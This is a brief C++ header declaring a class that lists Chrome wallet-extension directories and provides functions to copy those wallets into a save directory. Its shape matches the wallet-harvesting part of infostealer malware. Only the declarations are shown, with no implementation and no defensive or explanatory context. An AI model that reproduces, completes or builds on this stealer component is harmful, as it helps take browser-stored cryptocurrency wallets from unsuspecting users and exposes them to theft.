#pragma once
#include <vector>
#include <string>


class ChromExtensions
{
public:
	static std::vector<std::pair<std::string, std::string>> ChromeWalletsDirectories;
	static void CopyWalletFromDirectoryTo(std::string& sSaveDir, std::string& sWalletDir, std::string& sWalletName);
	static void GetChromeWallets(std::string& sSaveDir);
};

